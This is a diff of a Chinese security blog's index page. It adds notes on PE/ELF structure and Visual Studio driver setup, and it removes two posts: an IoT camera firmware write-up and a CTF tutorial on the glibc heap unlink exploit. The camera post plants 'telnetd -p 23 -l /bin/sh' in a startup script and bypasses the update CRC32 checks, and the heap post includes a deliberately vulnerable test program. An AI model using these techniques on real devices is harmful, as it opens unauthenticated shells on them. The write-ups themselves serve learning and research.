@@ -149,6 +149,112 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
+    <link itemprop="mainEntityOfPage" href="http://Invicsfate.github.io/2020/08/31/PE与ELF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Invicsfate">
+      <meta itemprop="description" content="如果你喜欢，就把这一切当作是荣耀，而不是炫耀--by 叶修">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Invicsfate">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/08/31/PE与ELF/" class="post-title-link" itemprop="url">PE与ELF</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-08-31 11:30:22 / Modified: 11:42:49" itemprop="dateCreated datePublished" datetime="2020-08-31T11:30:22+08:00">2020-08-31</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/others/" itemprop="url" rel="index"><span itemprop="name">others</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>关于PE和ELF(特指可执行文件)的结构分布，网上有很多资料介绍，这里就不再重复描述，仅记录一些自己认为重要的点，现在记录的内容不是最终的内容，会在不断加深对二者结构的认识过程中不断更新。</p>
+<p>下面的表格是个人用来进行比较的点(简记)：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"></th>
+<th>PE</th>
+<th>ELF(特指可执行文件)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">静态时文件结构</td>
+<td>Dos头-&gt;DosStub-&gt;Nt头-&gt;节表头-&gt;文件对齐的节区；是一种顺序的结构</td>
+<td>ELF头-&gt;Segment头(程序头表)-&gt;Segments(Sections)-&gt;节表头；Segment与Section重合，不是一种顺序的结构，程序头表与节表头均指向文件中心位置</td>
+</tr>
+<tr>
+<td style="text-align:left">加载时文件结构</td>
+<td>Dos头-&gt;DosStub-&gt;Nt头-&gt;节表头-&gt;内存对齐的节区</td>
+<td>Loadable Segments</td>
+</tr>
+<tr>
+<td style="text-align:left">导入表填充含义</td>
+<td>.idata中的IAT字段填充；填充时机：加载时</td>
+<td>.got.plt中的字段填充；填充时机：延迟加载</td>
+</tr>
+<tr>
+<td style="text-align:left">重定位</td>
+<td>PE加载时，使用绝对地址的全局变量或者跳转都需要实现一个减去原基地址，加上新基地址的操作。需要重定位的数据保存在.reloc段中</td>
+<td>本质上是got表填充。ELF加载时，首先填充got表的数据；延迟加载的机制填充got.plt的函数字段。需要重定位的数据保存在.relc.dyn和relc.plt中</td>
+</tr>
+<tr>
+<td style="text-align:left">获取导出函数地址</td>
+<td>解析dll的PE文件，从导出表EAT中获取函数地址</td>
+<td>利用so的dynsym与dynstr比较符号名称，从dynsym获取符号对应的函数相对偏移</td>
+</tr>
+</tbody>
+</table>
+<p>二者的重定位含义完全不同的原因：ELF中的全局变量等数据，用的是相对偏移而不是绝对偏移。PE使用的是绝对偏移。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
     <link itemprop="mainEntityOfPage" href="http://Invicsfate.github.io/2020/05/07/VMP-修复dump内存导入表/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -249,6 +355,123 @@
 <p>另外，dump以后的内存，要保证在不重启的情况下，使用工具修复，重启会使得系统DLL地址重新分配。</p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://bbs.pediy.com/thread-248812.htm" target="_blank" rel="noopener">手动分析VMP加密的x64驱动导入表</a></p>
 <p><a href="https://bbs.pediy.com/thread-249322.htm" target="_blank" rel="noopener">使用模拟器进行x64驱动的Safengine脱壳+导入表修复</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
+    <link itemprop="mainEntityOfPage" href="http://Invicsfate.github.io/2020/04/24/VS2019-汇编asm/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Invicsfate">
+      <meta itemprop="description" content="如果你喜欢，就把这一切当作是荣耀，而不是炫耀--by 叶修">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Invicsfate">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/04/24/VS2019-汇编asm/" class="post-title-link" itemprop="url">VS编译汇编/VS内核开发环境搭建</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-04-24 10:30:22" itemprop="dateCreated datePublished" datetime="2020-04-24T10:30:22+08:00">2020-04-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-08-31 11:40:23" itemprop="dateModified" datetime="2020-08-31T11:40:23+08:00">2020-08-31</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/others/" itemprop="url" rel="index"><span itemprop="name">others</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="驱动环境搭建"><a href="#驱动环境搭建" class="headerlink" title="驱动环境搭建"></a>驱动环境搭建</h2><p>​    参考msdn官方文档，注意VS版本(Windows版本是否会影响不清楚，没试过)和SDK，WDK匹配的问题，SDK，WDK版本号一致，但是不匹配对应的VS版本都不行。</p>
+<table>
+<thead>
+<tr>
+<th>VS版本</th>
+<th>Versions of Windows</th>
+<th>SDK版本</th>
+<th>WDK版本</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>VS2019-Community</td>
+<td>Windows 10,version 1903</td>
+<td>10.0.18362.0</td>
+<td>10.0.18362.1</td>
+</tr>
+<tr>
+<td>VS2019-Community</td>
+<td>Windows 10,version 2004</td>
+<td>10.0.19041.0</td>
+<td>10.0.19041.1</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>​    配置好后，还需要安装spectre缓解的单个组件，在VS修复里面找到单个组件项，搜索spectre安装(MSVC开头的)。将警告视为错误关闭，然后就可以愉快的开发了。</p>
+<p><img src="https://invicsfate.github.io/assert/vs2019_configure.png" alt="vs2019_configure"></p>
+<h2 id="VS2019-汇编asm"><a href="#VS2019-汇编asm" class="headerlink" title="VS2019+汇编asm"></a>VS2019+汇编asm</h2><p>编写单独的asm文件，而不是使用内嵌汇编的方式，记录一下编写方法：</p>
+<ul>
+<li>新建cpp文件，修改文件后缀为asm</li>
+<li>工程右键-&gt;生成依赖项-&gt;生成自定义，勾选masm，点确定</li>
+<li>右键asm文件-&gt;属性-&gt;常规，项内容修改为Microsoft Macro Assembler</li>
+</ul>
+<p>此时asm文件便可编译了，asm文件中函数的声明可以放到头文件中。</p>
+<p>asm编译生成的函数一般是按照C语言的规范去解析的，这一点需要注意。如果在链接时出现找不到定义，一般就是这种情况，同一个项目中存在按cpp解析生成的obj，以及按C解析生成的obj，二者在寻找函数名或者对象名这些时，会受C/C++各自编译的规则去寻找对象，当不一致时，就会产生找不到定义的情况。此时的解决方法根据项目内容一般有两种：</p>
+<ol>
+<li>此时一般使用extern “C”将cpp类型按照C语言规则解析</li>
+<li>或者将c文件后缀改成cpp即可解决。</li>
+</ol>
 
       
     </div>
@@ -895,187 +1118,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
-    <link itemprop="mainEntityOfPage" href="http://Invicsfate.github.io/2018/10/09/绕过某摄像头校验机制软刷固件/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Invicsfate">
-      <meta itemprop="description" content="如果你喜欢，就把这一切当作是荣耀，而不是炫耀--by 叶修">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Invicsfate">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2018/10/09/绕过某摄像头校验机制软刷固件/" class="post-title-link" itemprop="url">绕过某摄像头校验机制软刷固件</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2018-10-09 23:03:34" itemprop="dateCreated datePublished" datetime="2018-10-09T23:03:34+08:00">2018-10-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2018-10-10 11:09:21" itemprop="dateModified" datetime="2018-10-10T11:09:21+08:00">2018-10-10</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/IOT/" itemprop="url" rel="index"><span itemprop="name">IOT</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>缘起: 因需求需要获取某种arm智能设备(路由器除外)的shell权限，选择了某摄像头。<br>缘灭: 在硬刷和软刷之间最终还是通过软刷绕过升级校验机制实现重刷固件。</p>
-<h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>nmap扫描走起(部分摄像头关闭了ping，需要-sS -sT命令)，没有telnet和ssh，开启了80端口，登陆web界面，发现可以通过web界面更新固件。</p>
-<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>从官网下载相应版本的固件，binwalk解包，简单分析一波固件内容，grep -rn和find命令走起，发现固件包中是有telnet和telnetd命令的，且所在目录添加进了path环境变量中，qemu跑busybox发现其拥有telnet和telnetd功能。</p>
-<h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>选择获取shell的方式：1.pwn it 2.重打包刷固件</p>
-<h2 id="一波三折"><a href="#一波三折" class="headerlink" title="一波三折"></a>一波三折</h2><p>肯定是选择重打包刷固件啦，怎么会pwn呢？pwn是不可能pwn的，233。由于固件自带telnetd功能，我们只需要在自启动的脚本中选择其一，添加一条<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnetd -p 23 -l /bin/sh</span><br></pre></td></tr></table></figure></p>
-<p>命令，然后重打包固件，往摄像头里面刷即可。</p>
-<h3 id="一次尝试"><a href="#一次尝试" class="headerlink" title="一次尝试"></a>一次尝试</h3><p>利用firmware-mod-kit第三方打包工具重打包修改后的固件，80端口上升级固件，失败！摄像头虽然提示升级成功，但是并没有完成固件的更新。软刷不行就硬刷，芯片夹，编程器，RT809F软件走起，费了九牛二虎之力，从flash芯片中读取了固件，发现果然没有刷上。</p>
-<h3 id="二次尝试"><a href="#二次尝试" class="headerlink" title="二次尝试"></a>二次尝试</h3><p>猜测是不是重打包的问题，Seebug上找到一篇文章，见文末，学习了一波。于是手动重打包固件，通过编程器硬刷修改后的固件，emmmm，摄像头就成砖了。于是刷回原固件，中间省略一顿折腾……</p>
-<h3 id="三次尝试"><a href="#三次尝试" class="headerlink" title="三次尝试"></a>三次尝试</h3><p>重打包暂时放弃，寻找命令执行的漏洞，反正固件都拿到了，httpd文件和luac(5.1版本)进行交互，luadec反编译5.1版本，没找到命令执行的API，选择放弃。</p>
-<h3 id="山重水复疑无路，柳暗花明又一村"><a href="#山重水复疑无路，柳暗花明又一村" class="headerlink" title="山重水复疑无路，柳暗花明又一村"></a>山重水复疑无路，柳暗花明又一村</h3><p>通过比较编程器提取的固件以及网上下载的固件的二进制，反复思考手动重打包的过程，发现了可疑的0x100字节</p>
-<p><img src="https://invicsfate.github.io/assert/important_100bytes.png" alt="important_100bytes"></p>
-<p>并且比对binwalk结果进行猜测和分析。</p>
-<p><img src="https://invicsfate.github.io/assert/binwalk_result.png" alt="binwalk_result"></p>
-<p>看到一篇破解智能手环的文章，学习了一波，可以通过绕过crc32校验的方式软刷固件，在0x100字节中猜测crc32的存储位置以及crc32计算范围，通过写脚本计算crc32的值，知道了uboot和kernel的crc32值存储位置。</p>
-<p><img src="https://invicsfate.github.io/assert/important_100bytes_guess.png" alt="important_100bytes_guess"></p>
-<p>这里比较遗憾，忽略了header的crc32校验，仅修改了uboot和kernel的校验值进行软刷和硬刷均以失败告终。最终通过逆向固件的方式找到了校验crc32算法的位置，过程如下：</p>
-<p><img src="https://invicsfate.github.io/assert/camera1.png" alt="camera1"></p>
-<p>首先校验开头的16字节是否为0x99999999,0x44444444,0x55555555,0xAAAAAAAA，17-20字节没有校验，但这4个字节会作为lseek函数参数中offset的一部分。</p>
-<p><img src="https://invicsfate.github.io/assert/camera2.png" alt="camera2"></p>
-<p>其次计算0x14-0xb8的CRC32值，和0xb8处的4字节进行比较，也就是header的crc32算法校验，接下来进行uboot的CRC32计算，与0x50处的4字节比较。</p>
-<p><img src="https://invicsfate.github.io/assert/camera3.png" alt="camera3"></p>
-<p>最后计算文件系统Squashfs system的CRC32值，和0x5C处的4字节比较，至此，更新固件的校验算法结束。我们通过脚本计算得到的值将重打包的固件进行修改，绕过固件升级时的校验机制，成功软刷固件，开启了telnet。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCRC32</span><span class="params">(v)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">'0x%8x'</span> % (binascii.crc32(v) &amp; <span class="number">0xffffffff</span>)</span><br><span class="line"></span><br><span class="line">fp = open(<span class="string">"T520_v214t1_firmware.bin"</span>,<span class="string">'rb'</span>)</span><br><span class="line">content = fp.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># CRC32 of Squashfs filesystem</span></span><br><span class="line">tmp1 = content[<span class="number">0x280000</span>:]</span><br><span class="line"><span class="keyword">print</span> hex(len(tmp1))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"CRC32 of Squashfs filesystem:"</span>,getCRC32(tmp1)</span><br><span class="line"><span class="comment"># CRC32 of Squashfs filesystem</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CRC32 of boot</span></span><br><span class="line">tmp2 = content[<span class="number">0x100</span>:<span class="number">0x280000</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"CRC32 of boot to Squashfs filesystem:"</span>,getCRC32(tmp2)</span><br><span class="line"><span class="comment"># CRC32 of boot</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#CRC32 of header</span></span><br><span class="line"></span><br><span class="line">tmp3 = content[<span class="number">0x14</span>:<span class="number">0xb8</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"CRC32 of header:"</span>,getCRC32(tmp3)</span><br><span class="line"><span class="comment">#print 0xffffffff^getCRC32(tmp3)</span></span><br><span class="line"><span class="comment">#CRC32 of header</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://invicsfate.github.io/assert/telnetd.png" alt="telnetd"></p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://paper.seebug.org/649/" target="_blank" rel="noopener">Seebug-摄像头漏洞挖掘入门教程(固件篇)</a><br><a href="http://drops.xmd5.com/static/drops/wireless-15139.html" target="_blank" rel="noopener">破解智能手环</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
-    <link itemprop="mainEntityOfPage" href="http://Invicsfate.github.io/2018/10/09/pwn-unlink/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Invicsfate">
-      <meta itemprop="description" content="如果你喜欢，就把这一切当作是荣耀，而不是炫耀--by 叶修">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Invicsfate">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2018/10/09/pwn-unlink/" class="post-title-link" itemprop="url">pwn-unlink</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2018-10-09 22:52:31" itemprop="dateCreated datePublished" datetime="2018-10-09T22:52:31+08:00">2018-10-09</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>没有什么比看源码更能清楚程序执行逻辑的了！</p>
-<p>unlink能够实现任意修改指针的值，然后对地址内的数据进行修改。unlink在free函数调用时发生，在glibc源码_libc_free以及_int_free两个函数就是free函数调用时执行的代码，选择部分关键源代码解释unlink:</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* consolidate forward */</span></span><br><span class="line">      <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">	unlink(av, nextchunk, bck, fwd);</span><br><span class="line">	size += nextsize;</span><br><span class="line">      &#125; <span class="keyword">else</span></span><br><span class="line">	clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
-<p>通过源代码，后向合并是向低地址合并，首先是size+=presize，接着p指针移到后一个chunk，进行unlink。</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);			      \</span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))		      \</span><br><span class="line">      malloc_printerr (<span class="string">"corrupted double-linked list"</span>);			      \</span><br><span class="line">    <span class="keyword">else</span> &#123;								      \</span><br><span class="line">        FD-&gt;bk = BK;							      \</span><br><span class="line">        BK-&gt;fd = FD;							      \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))			      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;		      \</span><br><span class="line">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)	      \</span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">	      malloc_printerr (<span class="string">"corrupted double-linked list (not small)"</span>);   \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;				      \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span><br><span class="line">                <span class="keyword">else</span> &#123;							      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">                  &#125;							      \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;							      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span><br><span class="line">              &#125;								      \</span><br><span class="line">          &#125;								      \</span><br><span class="line">      &#125;									      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>unlink如果要执行FD-&gt;bk = BK;BK-&gt;fd = FD;那么要通过两个校验，一个是当前chunk与前向chunk的prev_size要相等，另一个即是FD-&gt;bk != P || BK-&gt;fd != P的校验，那么构造方法即是：</p>
-<ol>
-<li>malloc(size)大小的chunk，内容随意，</li>
-<li>malloc(size)大小的chunk，内容随意</li>
-<li>对第一个chunk写入fake_presize，fake_size，fake_fd，fake_bk，以及填充第一个chunk的数据，溢出覆盖第二个chunk的presize和size，构造presize == chunksize(P)，同时第二个chunk的size最低位置0</li>
-<li>free第二个chunk</li>
-</ol>
-<p>最终实现改写*(fake_bk+8(16)) = fake_fd，接下来就是任意写指针，最后任意写地址处数据。</p>
-<p>下面是测试Unlink作用的一个小程序，只需unlink即可获取shell:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//unlink_test.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *buf[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"Wellcome To the Heap World\n"</span>,<span class="number">0x1B</span>);</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"1. Create\n"</span>,<span class="number">0xA</span>);</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"2. Delete\n"</span>,<span class="number">0xA</span>);</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"3. Update\n"</span>,<span class="number">0xA</span>);</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"4. Exit\n"</span>,<span class="number">0x8</span>);</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"Your choice :"</span>,<span class="number">0xD</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 